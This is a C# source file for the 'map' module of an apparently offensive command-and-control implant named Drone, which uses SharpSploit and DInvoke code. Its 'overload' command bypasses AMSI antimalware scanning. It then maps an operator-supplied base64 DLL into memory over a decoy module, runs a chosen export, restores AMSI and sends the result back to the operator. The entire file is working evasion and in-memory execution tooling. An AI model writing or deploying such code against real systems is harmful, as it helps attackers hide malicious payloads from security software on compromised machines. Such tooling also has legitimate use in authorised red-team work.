using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

using Drone.Models;
using Drone.DInvoke.DynamicInvoke;
using Drone.DInvoke.ManualMap;
using Drone.SharpSploit.Evasion;

namespace Drone.Modules
{
    public class MapModule : DroneModule
    {
        public override string Name { get; } = "map";
        public override void AddCommands()
        {
            var overload = new Command("overload", "Map a native DLL into memory", OverloadNativeDll);
            overload.Arguments.Add(new Command.Argument("/path/to/dll", false, true));
            overload.Arguments.Add(new Command.Argument("export", false));
            overload.Arguments.Add(new Command.Argument("args"));
            
            Commands.Add(overload);
        }

        private void OverloadNativeDll(DroneTask task, CancellationToken token)
        {
            Evasion.BypassAmsi();

            var dll = Convert.FromBase64String(task.Artefact);
            var decoy = Overload.FindDecoyModule(dll.Length);

            if (string.IsNullOrEmpty(decoy))
            {
                Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
                return;
            }

            var map = Overload.OverloadModule(dll, decoy);
            var export = task.Arguments[0];

            object[] funcParams = { };

            if (task.Arguments.Length > 1)
                funcParams = new object[] {string.Join(" ", task.Arguments.Skip(1))};

            var result = (string) Generic.CallMappedDLLModuleExport(
                map.PEINFO,
                map.ModuleBase,
                export,
                typeof(GenericDelegate),
                funcParams);
            
            Evasion.RestoreAmsi();

            Drone.SendResult(task.TaskGuid, result);
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate string GenericDelegate(string input);
    }
}